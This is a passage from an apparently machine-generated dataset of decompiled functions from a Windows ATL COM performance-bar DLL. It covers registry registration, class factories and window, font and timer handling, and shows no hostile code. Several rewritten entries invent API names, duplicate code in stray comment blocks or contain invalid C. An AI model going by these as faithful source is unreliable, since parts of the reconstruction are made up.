== (FARPROC)0x0) goto LAB_1000f048;\nuVar7 = (*pFVar8)(param_2,param_1,0,0,0,0x2001f,0,&local_2254,&local_2238,*piVar2,0)\n;\n}\n}\nif (uVar7 == 0) {\nif ((HKEY)local_2260 != (HKEY)0x0) {\nuVar7 = RegCloseKey((HKEY)local_2260);\n}\nlocal_2260 = ZEXT48(local_2254);\n}\nlocal_8._0_1_ = 0;\nif (uVar7 != 0) goto LAB_1000f350;\n}\niVar3 = FUN_1000de90(this,param_1);\nif ((-1 < iVar3) &&\n((*param_1 != L'=' ||\n(iVar3 = FUN_1000e050(this,(HKEY *)&local_2260,(int *)0x0,param_1), -1 < iVar3))))\ngoto LAB_1000f0e1;\nbreak;\n}\nif (param_4 == 0) {\nuVar7 = FUN_1000d420(&local_2260,param_2,param_1,0x20019);\n}\nelse {\nuVar7 = 2;\n}\niVar3 = param_4;\nif (uVar7 != 0) {\niVar3 = 1;\n}\nuVar9 = FUN_10025329(local_21c,0x104,param_1,0xffffffff);\nFUN_1000d1b0(uVar9);\niVar4 = FUN_1000de90(this,param_1);\nif ((iVar4 < 0) || (iVar4 = FUN_1000e670(this,param_1), iVar4 < 0)) break;\nif (*param_1 == L'{') {\npWVar5 = param_1;\ndo {\nWVar1 = *pWVar5;\npWVar5 = pWVar5 + 1;\n} while (WVar1 != L'\\0');\nif ((int)pWVar5 - (int)(param_1 + 1) >> 1 == 1) {\niVar4 = FUN_1000ebc0(this,param_1,(HKEY)local_2260,0,iVar3);\nif (((iVar4 < 0) && (iVar3 == 0)) || (iVar3 = FUN_1000de90(this,param_1), iVar3 < 0))\nbreak;\n}\n}\nif (uVar7 != 2) {\nif (uVar7 == 0) {\nif (param_4 != 0) {\niVar3 = FUN_1000e600((HKEY)local_2260);\nif (iVar3 != 0) {\niVar3 = FUN_1000e5c0(local_21c);\nif ((iVar3 != 0) && (local_2254 != (HKEY)0x0)) {\nFUN_1000d510(&local_2260,local_21c);\n}\ngoto LAB_1000f309;\n}\n}\niVar3 = FUN_1000e600((HKEY)local_2260);\nuVar7 = 0;\nif ((HKEY)local_2260 != (HKEY)0x0) {\nuVar7 = RegCloseKey((HKEY)local_2260);\nlocal_2260 = 0;\n}\nlocal_2260 = local_2260 & 0xffffffff;\nif (uVar7 != 0) goto LAB_1000f350;\nif ((local_2254 != (HKEY)0x0) && (iVar3 == 0)) {\nlocal_2250 = param_2;\nlocal_224c = iVar3;\nlocal_2248 = iVar3;\nuVar7 = FUN_1000d2f0(&local_2250,local_21c);\nlocal_2250 = (HKEY)0x0;\nif (uVar7 != 0) goto LAB_1000f350;\n}\n}\nelse if (param_4 == 0) {\nLAB_1000f350:\nFUN_1000d270(uVar7);\nbreak;\n}\n}\n}\nLAB_1000f309:\nWVar1 = *param_1;\n}\nLAB_1000f357:\nif ((HKEY)local_2260 != (HKEY)0x0) {\nRegCloseKey((HKEY)local_2260);\n}\n}\nExceptionList = local_10;\n___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_21c : undefined1\nLocal Variable: local_221c : undefined1\nLocal Variable: local_2220 : undefined4\nLocal Variable: local_2224 : undefined4\nLocal Variable: local_2228 : undefined4\nLocal Variable: local_222c : undefined4\nLocal Variable: local_2234 : undefined8\nLocal Variable: local_2238 : undefined1\nLocal Variable: local_223c : undefined4\nLocal Variable: local_2240 : undefined4\nLocal Variable: local_2244 : undefined4\nLocal Variable: local_2248 : undefined4\nLocal Variable: local_224c : undefined4\nLocal Variable: local_2250 : undefined4\nLocal Variable: local_2254 : undefined4\nLocal Variable: local_2258 : undefined4\nLocal Variable: local_2260 : undefined8\nLocal Variable: local_2264 : undefined4\nLocal Variable: local_2268 : undefined4\nLocal Variable: local_226c : undefined4"}
{"Function Name": "FUN_1000f390", "Address": "1000f390", "Source Code": "void __fastcall FUN_1000f390(undefined4 inputParam, uint flags, int statusCode, undefined4 *moduleParams)\n{\n    short shortValue; \n    code *functionPtr; \n    HMODULE moduleHandle; \n    uint xorValue; \n    int resultCode; \n    DWORD fileNameLength; \n    HMODULE anotherModuleHandle; \n    undefined8 *currentValuePtr; \n    undefined4 *allocatedMemoryPtr; \n    short *shortArrayPtr; \n    undefined **vtablePtr; \n    undefined4 initialValue; \n    void *tempPointer; \n    undefined8 fileNameBuffer; \n    undefined dataBuffer[1048]; \n    WCHAR wideCharBuffer[260]; \n    uint localXorValue; \n    void *originalExceptionList; \n    originalExceptionList = ExceptionList; \n    xorValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    vtablePtr = ATL::CRegObject::vftable; \n    initialValue = 0; \n    if (moduleParams != (undefined4 *)0x0) { \n        currentValuePtr = (undefined8 *)*moduleParams; \n        while (currentValuePtr != (undefined8 *)0x0) { \n            if ((currentValuePtr != (undefined8 *)0x0) && ((undefined8 *)moduleParams[1] != (undefined8 *)0x0)) { \n                FUN_1000d680(&initialValue, currentValuePtr, (undefined8 *)moduleParams[1]); \n            }\n            moduleParams += 2; \n            currentValuePtr = (undefined8 *)*moduleParams; \n        }\n    }\n    ExceptionList = originalExceptionList; \n    resultCode = (*(code *)vtablePtr[3])(&vtablePtr, L\"APPID\", &DAT_10048528, xorValue); \n    moduleHandle = DAT_1004fccc; \n    if (-1 < resultCode) { \n        tempPointer = (void *)0x0; \n        fileNameLength = GetModuleFileNameW(DAT_1004fccc, wideCharBuffer, 0x104); \n        if (fileNameLength == 0) { \n            FUN_1000d250(); \n        } else {\n            if (fileNameLength == 0x104) { \n                FUN_1000b490(&tempPointer); \n                FUN_1000da60(&vtablePtr); \n                return; \n            }\n            FUN_1000d280(&fileNameBuffer, wideCharBuffer); \n            if ((moduleHandle == (HMODULE)0x0) || (anotherModuleHandle = GetModuleHandleW((LPCWSTR)0x0), moduleHandle == anotherModuleHandle)) { \n                currentValuePtr = &fileNameBuffer; \n                dataBuffer._0_2_ = 0x22; \n                do {\n                    shortValue = *(short *)currentValuePtr; \n                    currentValuePtr = (undefined8 *)((int)currentValuePtr + 2); \n                } while (shortValue != 0); \n                xorValue = ((int)currentValuePtr - ((int)&fileNameBuffer + 2) >> 1) * 2 + 2; \n                if (xorValue != 0) { \n                    if (0x416 < xorValue) { \n                        allocatedMemoryPtr = (undefined4 *)FUN_100253b8(); \n                        *allocatedMemoryPtr = 0x22; \n                        FUN_1001de96(); \n                        FUN_1000b490(&tempPointer); \n                        FUN_1000da60(&vtablePtr); \n                        return; \n                    }\n                    FUN_10018670((undefined8 *)(dataBuffer + 2), &fileNameBuffer, xorValue); \n                }\n                shortArrayPtr = (short *)dataBuffer; \n                do {\n                    shortValue = *shortArrayPtr; \n                    shortArrayPtr++; \n                } while (shortValue != 0); \n                resultCode = (int)shortArrayPtr - (int)(dataBuffer + 2) >> 1; \n                wideCharBuffer[resultCode + -0x20c] = L'\\\"'; \n                if (0x417 < resultCode * 2 + 2U) { \n                    ___report_rangecheckfailure(); \n                    functionPtr = (code *)swi(3); \n                    (*functionPtr)(); \n                    return; \n                }\n                wideCharBuffer[resultCode + -0x20b] = L'\\0'; \n                currentValuePtr = (undefined8 *)dataBuffer; \n            } else {\n                currentValuePtr = &fileNameBuffer; \n            }\n            resultCode = FUN_1000d680(&initialValue, (undefined8 *)L\"Module\", currentValuePtr); \n            if ((-1 < (int)((-(uint)(resultCode != 0) & 0x7ff8fff2) + 0x8007000e)) && \n                (resultCode = FUN_1000d680(&initialValue, (undefined8 *)L\"Module_Raw\", &fileNameBuffer), resultCode != 0)) { \n                FUN_1000dbb0(wideCharBuffer, (LPCWSTR)(flags & 0xffff), L\"REGISTRY\"); \n            }\n            FUN_1000b490(&tempPointer); \n        }\n    }\n    FUN_1000da60(&vtablePtr); \n    ExceptionList = originalExceptionList; \n    ___security_check_cookie_4(localXorValue ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "FUN_1000f650", "Address": "1000f650", "Source Code": "int __fastcall FUN_1000f650(int input_value_1, int input_value_2, int *input_array, int **output_pointer)\n{\n    code *function_pointer; \n    int return_value; \n    int *integer_pointer; \n    code **function_pointer_array; \n    \n    if ((input_value_1 == 0) || (input_value_2 == 0)) {\n        return -0x7ff8ffa9; \n    }\n    \n    \n    if (output_pointer == (int **)0x0) {\n        return -0x7fffbffd; \n    }\n    \n    \n    if (((*input_array == 0) && (input_array[1] == 0)) && (input_array[2] == 0xc0) && (input_array[3] == 0x46000000)) {\n        \n        integer_pointer = (int *)(*(int *)(input_value_2 + 4) + input_value_1);\n        \n        (**(code **)(*integer_pointer + 4))(integer_pointer);\n        *output_pointer = integer_pointer; \n        return 0; \n    }\n    \n    \n    function_pointer_array = (code **)(input_value_2 + 8);\n    function_pointer = *function_pointer_array; \n    \n    while (function_pointer != (code *)0x0) {\n        integer_pointer = (int *)function_pointer_array[-2]; \n        \n        if ((integer_pointer == (int *)0x0) || ((*integer_pointer == *input_array && (integer_pointer[1] == input_array[1])) && (integer_pointer[2] == input_array[2] && (integer_pointer[3] == input_array[3])))) {\n            \n            if (*function_pointer_array == (code *)0x1) {\n                integer_pointer = (int *)(function_pointer_array[-1] + input_value_1); \n                \n                (**(code **)(*integer_pointer + 4))(integer_pointer);\n                *output_pointer = integer_pointer; \n                return 0; \n            }\n            \n            return_value = (**function_pointer_array)(input_value_1, input_array, output_pointer, function_pointer_array[-1]);\n            if (return_value == 0) {\n                return 0; \n            }\n            \n            if ((integer_pointer != (int *)0x0) && (return_value < 0)) goto LAB_1000f713; \n        }\n        function_pointer_array += 3; \n        function_pointer = *function_pointer_array; \n    }\n    \n    return_value = -0x7fffbffe; \nLAB_1000f713:\n    *output_pointer = (int *)0x0; \n    return return_value; \n}"}
{"Function Name": "FUN_1000f760", "Address": "1000f760", "Source Code": "undefined4 FUN_1000f760(int function_pointer_address, int input_value, int *validation_array, undefined4 *output_pointer)\n{\n    \n    if (output_pointer == (undefined4 *)0x0) {\n        return 0x80004003; \n    }\n    \n    *output_pointer = 0; \n    \n    \n    if (input_value != 0 && \n        (validation_array[0] != 0 || validation_array[1] != 0 || validation_array[2] != 0xc0 || validation_array[3] != 0x46000000)) {\n        return 0x80040110; \n    }\n    \n    \n    return (**(code **)(function_pointer_address + 0x24))(input_value, validation_array, output_pointer);\n}"}
{"Function Name": "FUN_1000f7c0", "Address": "1000f7c0", "Source Code": "undefined4 FUN_1000f7c0(undefined4 input_value, int change_value)\n{\n    LOCK();  \n    *(int *)(shared_memory_address + 8) += (change_value != 0) ? 1 : -1;  \n    UNLOCK();  \n    return 0;  \n}"}
{"Function Name": "FUN_1000f7f0", "Address": "1000f7f0", "Source Code": "\\*\nundefined4 * __thiscall FUN_1000f7f0(void *object, byte flag)\n{\n    \n    *(undefined ***)object = ATL::CComClassFactory::vftable;\n    \n    if (*(char *)((int)object + 0x20) != '\\0') {\n        \n        *(undefined *)((int)object + 0x20) = 0;\n        \n        DeleteCriticalSection((LPCRITICAL_SECTION)((int)object + 8));\n    }\n    \n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_1000f7f0(void *object, byte flag)\n{\n    *(undefined ***)object = ATL::CComClassFactory::vftable;\n    if (*(char *)((int)object + 0x20) != '\\0') {\n        *(undefined *)((int)object + 0x20) = 0;\n        DeleteCriticalSection((LPCRITICAL_SECTION)((int)object + 8));\n    }\n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_1000fa10", "Address": "1000fa10", "Source Code": "void FUN_1000fa10(int input_param) \n{\n    int *int_pointer; \n    void *void_pointer; \n    if (input_param != 0) { \n        int_pointer = *(int **)(input_param + 0xc); \n        if (int_pointer != (int *)0x0) { \n            (**(code **)(*int_pointer + 8))(int_pointer, DAT_1004e008 ^ (uint)&stack0xfffffffc); \n        }\n        void_pointer = *(void **)(input_param + 0x14); \n        *(undefined4 *)(input_param + 0xc) = 0; \n        if (void_pointer != (void *)0x0) { \n            _eh_vector_destructor_iterator_(void_pointer, 0xc, *(uint *)((int)void_pointer + -4), FUN_10007d30); \n            FUN_10014414((uint *)((int)void_pointer + -4)); \n        }\n        *(undefined4 *)(input_param + 0x14) = 0; \n    }\n    return; \n}"}
{"Function Name": "FUN_1000ff00", "Address": "1000ff00", "Source Code": "\\*\nundefined4 * method FUN_1000ff00(void *instance, byte flag)\n{\n    \n    FUN_1000fe70((undefined4 *)instance);\n    \n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(instance);\n    }\n    \n    \n    return (undefined4 *)instance;\n}\n*\\ \n \nundefined4 * method FUN_1000ff00(void *instance, byte flag)\n{\n    FUN_1000fe70((undefined4 *)instance);\n    if (flag & 1) {\n        FUN_10013ceb(instance);\n    }\n    return (undefined4 *)instance;\n}"}
{"Function Name": "FUN_1000ff30", "Address": "1000ff30", "Source Code": "int __fastcall FUN_1000ff30(int input_param)\n{\n    code *function_pointer; \n    undefined4 result_value; \n    undefined4 *memory_pointer; \n    function_pointer = DefWindowProcW_exref; \n    exception_list = &local_variable; \n    *(undefined4 *)(input_param + 0x38) = 0; \n    *(undefined4 *)(input_param + 0x18) = 0; \n    *(undefined4 *)(input_param + 0x28) = 0; \n    *(undefined4 *)(input_param + 0x2c) = 0; \n    *(undefined4 *)(input_param + 0x30) = 0; \n    *(code **)(input_param + 0x34) = function_pointer; \n    *(undefined ***)(input_param + 0x3c) = CPerfMon::vftable; \n    *(undefined4 *)(input_param + 0x44) = 0; \n    *(undefined4 *)(input_param + 0x48) = 0; \n    *(undefined4 *)(input_param + 0x4c) = 0; \n    *(undefined4 *)(input_param + 0x40) = 0; \n    *(undefined4 *)(input_param + 0x50) = 0; \n    *(undefined4 *)(input_param + 0x54) = 0; \n    memory_pointer = (undefined4 *)(input_param + 0x58); \n    *memory_pointer = 0; \n    *(undefined4 *)(input_param + 0x5c) = 0; \n    *(undefined4 *)(input_param + 0x60) = 0; \n    result_value = FUN_1000d140(0, 0); \n    *(undefined4 *)(input_param + 0x5c) = result_value; \n    *(undefined4 *)(input_param + 100) = 0; \n    *(undefined4 *)(input_param + 0x68) = 0; \n    *(undefined4 *)(input_param + 0x6c) = 0; \n    *memory_pointer = 0x3f800000; \n    FUN_1000ba50((void *)(input_param + 100), 0x10); \n    FUN_1000b7e0((void *)(input_param + 100), 0x10, memory_pointer); \n    *(undefined4 *)(input_param + 0x70) = 7; \n    *(undefined4 *)(input_param + 0x74) = 8; \n    *(undefined4 *)(input_param + 0x78) = 0; \n    *(undefined4 *)(input_param + 0x7c) = 0; \n    *(undefined4 *)(input_param + 0x80) = 0; \n    *(undefined4 *)(input_param + 0x84) = 10; \n    *(undefined4 *)(input_param + 0x88) = 10; \n    *(undefined4 *)(input_param + 0x8c) = 0; \n    *(undefined4 *)(input_param + 0x90) = 0; \n    return input_param; \n}"}
{"Function Name": "FUN_100100c0", "Address": "100100c0", "Source Code": "undefined4 __thiscall\nFUN_100100c0(void *this, undefined4 param_1, int param_2, undefined4 param_3, undefined4 param_4,\nundefined4 *param_5, int param_6)\n{\n    HDC hdc; \n    HFONT pHVar2; \n    undefined4 uVar3; \n    \n    if (param_6 == 0) {\n        \n        if (param_2 != 1) {\n            \n            if (param_2 == 2) {\n                \n                if (*(HGDIOBJ *)((int)this + 0x40) != (HGDIOBJ)0x0) {\n                    \n                    DeleteObject(*(HGDIOBJ *)((int)this + 0x40));\n                    \n                    *(undefined4 *)((int)this + 0x40) = 0;\n                }\n                *param_5 = 0; \n                return 0; \n            }\n            \n            if (param_2 == 0xf) {\n                \n                uVar3 = FUN_10011530((void *)((int)this + -0x14));\n                *param_5 = uVar3; \n                return 1; \n            }\n            \n            if (param_2 == 0x14) {\n                *param_5 = 1; \n                return 1; \n            }\n            \n            if (param_2 == 0x201) {\n                \n                *(uint *)((int)this + 0x78) =\n                    (*(int *)((int)this + 0x78) + 1U) %\n                    (uint)(*(int *)((int)this + 0x68) - *(int *)((int)this + 100) >> 4);\n            } else {\n                return 0; \n            }\n        }\n        \n        InvalidateRect(*(HWND *)((int)this + 4), (RECT *)0x0, 1);\n        *param_5 = 0; \n        return 1; \n    }\n    \n    hdc = GetDC(*(HWND *)((int)this + 4));\n    \n    pHVar2 = CreateFontW(-MulDiv(8, GetDeviceCaps(hdc, 0x5a), 0x48), 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, L\"Arial\");\n    *(HFONT *)((int)this + 0x40) = pHVar2; \n    ReleaseDC(*(HWND *)((int)this + 4), hdc); \n    \n    SetTimer(*(HWND *)((int)this + 4), 1000, 1000, (TIMERPROC)0x0);\n    *param_5 = 0; \n    return 0; \n}"}
{"Function Name": "FUN_10010210", "Address": "10010210", "Source Code": "void __fastcall FUN_10010210(int input_param)\n{\n    \n    void *first_pointer = *(void **)(input_param + 0x20);\n    void *second_pointer;\n    \n    if (first_pointer != (void *)0x0) {\n        \n        second_pointer = *(void **)(input_param + 0x24);\n        \n        if (first_pointer != second_pointer) {\n            \n            do {\n                \n                FUN_1000b580((int *)((int)first_pointer + 4));\n                \n                first_pointer = (void *)((int)first_pointer + 0x10);\n            } while (first_pointer != second_pointer); \n        }\n    }\n    \n    second_pointer = *(void **)(input_param + 0x20);\n    \n    if ((0xfff < (*(int *)(input_param + 0x28) - (int)second_pointer & 0xfffffff0U)) &&\n        (second_pointer = (void *)((int)second_pointer - 4), 0x1f < (uint)((int)first_pointer + (-4 - (int)second_pointer)))) {\n        \n        FUN_1001dea6();\n        \n        ((code *)swi(3))();\n        return; \n    }\n    \n    FUN_10013ceb(second_pointer);\n    \n    *(undefined4 *)(input_param + 0x20) = 0;\n    *(undefined4 *)(input_param + 0x24) = 0;\n    *(undefined4 *)(input_param + 0x28) = 0;\n    \n    FUN_10010290(input_param);\n}"}
{"Function Name": "FUN_10010290", "Address": "10010290", "Source Code": "void __fastcall FUN_10010290(int inputParam)\n{\n    \n    void *pointerOffsetC = *(void **)(inputParam + 0xc);\n    \n    \n    if (pointerOffsetC != (void *)0x0) {\n        \n        \n        if ((0xfff < (*(int *)(inputParam + 0x14) - (int)pointerOffsetC & 0xfffffffcU)) &&\n            (void *previousPointer = *(void **)((int)pointerOffsetC + -4), 0x1f < (uint)((int)pointerOffsetC + (-4 - (int)previousPointer)))) {\n            \n            functionCall1();\n            \n            ((code *)systemCall(3))();\n            return; \n        }\n        \n        \n        functionCall2(*(void **)((int)pointerOffsetC + -4));\n        \n        \n        *(undefined4 *)(inputParam + 0xc) = 0;\n        *(undefined4 *)(inputParam + 0x10) = 0;\n        *(undefined4 *)(inputParam + 0x14) = 0;\n    }\n    \n    \n    functionCall3((int **)(inputParam + 4));\n    \n    \n    functionCall2(*(void **)(inputParam + 4));\n}"}
{"Function Name": "FUN_10010300", "Address": "10010300", "Source Code": "undefined4 set_array_element_and_call_function(int *array_pointer)\n{\n    \n    array_pointer[0x23] = 0;\n    \n    \n    (*(code *)(*array_pointer + 0x20))(array_pointer);\n    \n    return 0;\n}"}
{"Function Name": "FUN_10010740", "Address": "10010740", "Source Code": "undefined4 FUN_10010740(int input_param, undefined4 value_1, undefined4 value_2, uint *output_array)\n{\n    \n    if (output_array != (uint *)0x0) {\n        \n        uint flag_value = *output_array;\n        \n        if (flag_value & 1) {\n            output_array[1] = *(uint *)(input_param + 0x78); \n            output_array[2] = *(uint *)(input_param + 0x7c); \n        }\n        \n        if (flag_value & 2) {\n            output_array[3] = 0xffffffff; \n            output_array[4] = 0xffffffff; \n        }\n        \n        if (flag_value & 4) {\n            output_array[5] = 1; \n            output_array[6] = 1; \n        }\n        \n        if (flag_value & 8) {\n            output_array[7] = 0; \n            output_array[8] = 0; \n        }\n        \n        if (flag_value & 0x20) {\n            output_array[0x89] = 0xc; \n        }\n        \n        return 0;\n    }\n    \n    return 0x80070057;\n}"}
{"Function Name": "FUN_100107c0", "Address": "100107c0", "Source Code": "undefined4 FUN_100107c0(int input_value, undefined4 *output_pointer)\n{\n    \n    if (output_pointer == (undefined4 *)0x0) {\n        \n        return 0x80070057;\n    }\n    \n    \n    *output_pointer = *(undefined4 *)(input_value + 0xc);\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_10010800", "Address": "10010800", "Source Code": "undefined4 FUN_10010800(int window_handle, int show_hide_flag)\n{\n    \n    if (IsWindow(*(HWND *)(window_handle + 0xc))) {\n        \n        \n        ShowWindow(*(HWND *)(window_handle + 0xc), show_hide_flag != 0 ? 5 : 0);\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_10010840", "Address": "10010840", "Source Code": "undefined4 execute_window_function(int *window_handle_array)\n{\n    \n    (**(code **)(*window_handle_array + 0x14))(window_handle_array, 0);\n    \n    \n    if (is_valid_window((HWND)window_handle_array[3])) {\n        \n        destroy_window((HWND)window_handle_array[3]);\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_100108a0", "Address": "100108a0", "Source Code": "undefined4 FUN_100108a0(int address, undefined4 value)\n{\n    \n    *(undefined4 *)(address + 0x84) = value;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_100108c0", "Address": "100108c0", "Source Code": "undefined4 FUN_100108c0(int input_address, undefined4 *output_value)\n{\n    \n    *output_value = *(undefined4 *)(input_address + 0x84);\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_10010b00", "Address": "10010b00", "Source Code": "undefined4 FUN_10010b00(int input_value, undefined4 status_code, undefined4 *output_pointer)\n{\n    \n    if (output_pointer == (undefined4 *)0x0) {\n        \n        return 0x80070057;\n    }\n    \n    \n    if (*(int *)(input_value + 0x4c) != 0) {\n        \n        *output_pointer = 0;\n        \n        return (**(code **)**(undefined4 **)(input_value + 0x4c))();\n    }\n    \n    \n    return 0x80004005;\n}"}
{"Function Name": "FUN_10010d70", "Address": "10010d70", "Source Code": "undefined4 FUN_10010d70(undefined4 inputValue, undefined4 *outputArray)\n{\n    \n    if (outputArray == (undefined4 *)0x0) {\n        \n        return 0x80070057;\n    }\n    \n    \n    *outputArray = 0;\n    \n    \n    outputArray[1] = 0;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_100114c0", "Address": "100114c0", "Source Code": "void __fastcall FUN_100114c0(int input_param)\n{\n    void *memory_pointer; \n    code *function_pointer; \n    memory_pointer = *(void **)(input_param + 0xc); \n    if (memory_pointer != (void *)0x0) { \n        \n        \n        if ((0xfff < (*(int *)(input_param + 0x14) - (int)memory_pointer & 0xfffffffcU)) &&\n            (0x1f < (uint)((int)memory_pointer + (-4 - *(int **)((int)memory_pointer + -4))))) {\n            FUN_1001dea6(); \n            function_pointer = (code *)swi(3); \n            (*function_pointer)(); \n            return; \n        }\n        FUN_10013ceb(*(void **)((int)memory_pointer + -4)); \n        *(undefined4 *)(input_param + 0xc) = 0; \n        *(undefined4 *)(input_param + 0x10) = 0; \n        *(undefined4 *)(input_param + 0x14) = 0; \n    }\n    FUN_10011f00((int **)(input_param + 4)); \n    FUN_10013ceb(*(void **)(input_param + 4)); \n    return; \n}"}
{"Function Name": "FUN_10011740", "Address": "10011740", "Source Code": "void FUN_10011740(undefined4 input1, undefined4 input2, undefined4 input5, \n                  undefined4 input6, undefined4 input7, undefined4 input8, \n                  undefined4 input9, LCID locale)\n{\n    \n    if (globalPointer == (int *)0x0 || globalValue == 0) {\n        \n        functionCall(locale);\n    }\n    \n    \n    if (globalPointer != (int *)0x0) {\n        \n        \n        (**(code **)(*globalPointer + 0x2c))(globalPointer, input1, input2, \n                                                input5, input6, input7, \n                                                input8, input9);\n    }\n}"}
{"Function Name": "FUN_100118e0", "Address": "100118e0", "Source Code": "undefined4 FUN_100118e0(undefined4 inputValue, int errorCodeCheck, LCID localeId, int **outputPointer)\n{\n    \n    if (errorCodeCheck != 0) {\n        return 0x8002000b; \n    }\n    \n    \n    if (outputPointer == (int **)0x0) {\n        return 0x80004003; \n    }\n    \n    \n    if (globalData == (int *)0x0) {\n        FUN_1000faa0(localeId); \n    }\n    \n    \n    *outputPointer = globalData;\n    \n    \n    if (globalData != (int *)0x0) {\n        \n        (**(code **)(*globalData + 4))(globalData);\n    }\n    \n    return 0; \n}"}
{"Function Name": "FUN_10011940", "Address": "10011940", "Source Code": "undefined4 FUN_10011940(undefined4 input_value, undefined4 *output_pointer)\n{\n    \n    if (output_pointer == NULL) {\n        \n        return 0x80004003;\n    }\n    \n    *output_pointer = 1;\n    \n    return 0;\n}"}
{"Function Name": "FUN_10011960", "Address": "10011960", "Source Code": "void FUN_10011960(int input_value, undefined4 status_code, undefined4 *data_pointer)\n{\n    \n    if (input_value == 0) {\n        \n        FUN_10011c10(0, status_code, data_pointer);\n    } else {\n        \n        FUN_10011ad0(input_value, status_code, data_pointer);\n    }\n}"}
{"Function Name": "FUN_100119c0", "Address": "100119c0", "Source Code": "DWORD FUN_100119c0(int inputParam, undefined4 inputParam2, undefined4 *outputParam)\n{\n    int *intArrayPtr; \n    DWORD statusCode = 0x8007000e; \n    if (outputParam != (undefined4 *)0x0) { \n        *outputParam = 0; \n        intArrayPtr = (int *)allocateMemory(0x28); \n        if (intArrayPtr != (int *)0x0) { \n            intArrayPtr[1] = 0; \n            *(undefined (*) [16])(intArrayPtr + 2) = ZEXT816(0); \n            *(undefined8 *)(intArrayPtr + 6) = 0; \n            *(undefined *)(intArrayPtr + 8) = 0; \n            *intArrayPtr = (int)ATL::CComObjectCached<class_ATL::CComClassFactory>::vftable; \n            statusCode = 0; \n            intArrayPtr[9] = inputParam; \n            if (initializeCriticalSection((LPCRITICAL_SECTION)(intArrayPtr + 2), 0, 0) == 0) { \n                statusCode = retrieveLastError() & 0xffff | 0x80070000; \n            }\n            if ((int)statusCode >= 0) { \n                *(undefined *)(intArrayPtr + 8) = 1; \n            }\n            if ((int)statusCode < 0) { \n                return statusCode; \n            }\n            statusCode = (**(code **)*intArrayPtr)(intArrayPtr, inputParam2, outputParam); \n            if (statusCode != 0) { \n                (**(code **)(*intArrayPtr + 0x14))(1); \n            }\n        }\n    }\n    return statusCode; \n}"}
{"Function Name": "FUN_10011c10", "Address": "10011c10", "Source Code": "int __fastcall FUN_10011c10(undefined4 input_param_1, undefined4 input_param_2, undefined4 *output_param)\n{\n    int *int_pointer; \n    int shared_resource_value; \n    int return_value; \n    void *original_exception_list; \n    \n    if (output_param == (undefined4 *)0x0) {\n        return -0x7fffbffd; \n    }\n    \n    original_exception_list = current_exception_list; \n    current_exception_list = &original_exception_list; \n    *output_param = 0; \n    int_pointer = (int *)FUN_100143c4(0x94); \n    \n    \n    if (int_pointer != (int *)0x0) {\n        FUN_1000ff30((int)int_pointer); \n        shared_resource_value = shared_resource; \n        \n        \n        int_pointer[0] = (int)ATL::CComObject<class_CPerfBar>::vftable;\n        int_pointer[1] = (int)ATL::CComObject<class_CPerfBar>::vftable;\n        int_pointer[2] = (int)ATL::CComObject<class_CPerfBar>::vftable;\n        int_pointer[3] = (int)ATL::CComObject<class_CPerfBar>::vftable;\n        int_pointer[4] = (int)ATL::CComObject<class_CPerfBar>::vftable;\n        int_pointer[5] = (int)ATL::CComObject<class_CPerfBar>::vftable;\n        LOCK(); \n        *(int *)(shared_resource_value + 8) = *(int *)(shared_resource_value + 8) + 1; \n        UNLOCK(); \n        int_pointer[0xe] = int_pointer[0xe] + 1; \n        \n        if ((undefined **)*int_pointer == ATL::CComObject<class_CPerfBar>::vftable) {\n            int_pointer[0x23] = 0; \n            (*(code *)function_pointer)(); \n            shared_resource_value = 0; \n        } else {\n            shared_resource_value = (*(code *)((undefined **)*int_pointer)[7])(); \n        }\n        \n        return_value = (shared_resource_value < 0) ? shared_resource_value : 0; \n        int_pointer[0xe] = int_pointer[0xe] - 1; \n        \n        if ((return_value == 0) && (return_value = (**(code **)*int_pointer)(int_pointer, input_param_2, output_param), return_value == 0)) {\n            current_exception_list = original_exception_list; \n            return 0; \n        }\n        (**(code **)(int_pointer[5] + 4))(1); \n    }\n    \n    current_exception_list = original_exception_list; \n    return return_value; \n}"}
{"Function Name": "FUN_10011df0", "Address": "10011df0", "Source Code": "\\*\nundefined4 * __thiscall FUN_10011df0(void *object, byte flag)\n{\n    \n    *(undefined4 *)((int)object + 4) = 0xc0000001;\n    \n    *(undefined ***)object = ATL::CComClassFactory::vftable;\n    \n    \n    if (*(char *)((int)object + 0x20) != '\\0') {\n        \n        *(undefined *)((int)object + 0x20) = 0;\n        \n        DeleteCriticalSection((LPCRITICAL_SECTION)((int)object + 8));\n    }\n    \n    \n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10011df0(void *object, byte flag)\n{\n    *(undefined4 *)((int)object + 4) = 0xc0000001;\n    *(undefined ***)object = ATL::CComClassFactory::vftable;\n    \n    if (*(char *)((int)object + 0x20) != '\\0') {\n        *(undefined *)((int)object + 0x20) = 0;\n        DeleteCriticalSection((LPCRITICAL_SECTION)((int)object + 8));\n    }\n    \n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10011e30", "Address": "10011e30", "Source Code": "void FUN_10011e30(int function_pointer_address, undefined4 first_param, undefined4 second_param)\n{\n    \n    void *current_exception_list = ExceptionList;\n    \n    \n    ExceptionList = &current_exception_list;\n    \n    \n    \n    \n    (**(code **)(*(undefined4 **)(function_pointer_address + 0x38)))(*(undefined4 **)(function_pointer_address + 0x38), first_param, second_param, DAT_1004e008 ^ (uint)&stack0xfffffffc);\n    \n    \n    ExceptionList = current_exception_list;\n}"}
